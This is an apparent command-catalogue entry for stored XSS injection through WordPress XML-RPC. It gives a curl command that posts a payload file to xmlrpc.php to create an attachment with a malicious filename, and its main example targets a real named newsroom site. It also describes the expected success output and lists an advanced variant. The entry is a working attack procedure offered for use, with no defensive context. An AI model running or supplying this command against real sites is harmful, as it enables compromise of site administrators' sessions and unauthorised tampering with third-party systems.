---
data: >-
  curl 'https://newsroom.uber.com/us-new-york/xmlrpc.php' --data-binary "`cat
  xss.xml`" -H 'Content-type: application/xml'
tags:
  - xss
  - xmlrpc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.527Z'
id: 7fac0626-76a3-427b-837c-abaae17fef81
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-xss-injection

## Command

```bash
curl 'https://newsroom.uber.com/us-new-york/xmlrpc.php' --data-binary "`cat xss.xml`" -H 'Content-type: application/xml'
```

## Description

Injects stored XSS via XMLRPC by creating an attachment with malicious filename, exploitable in admin media list.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data-binary` | XML payload from xss.xml with XSS in file param | Yes |
| `-H 'Content-type: application/xml'` | XML header | Yes |
| URL | Specific site path to xmlrpc.php | Yes |

## Examples

### Basic Usage

```bash
curl 'https://example.com/xmlrpc.php' --data-binary "`cat xss.xml`" -H 'Content-type: application/xml'
```

### Advanced Usage

```bash
curl -s 'https://example.com/xmlrpc.php' --data-binary @xss.xml -H 'Content-type: application/xml' | xmllint --format -
```

## Expected Output

XML with <int>ID</int> of new attachment, e.g., <int>123</int>, indicating successful injection.

## Related

- [[Related Procedure: Inject-Stored-XSS-via-Attachment-Name]]
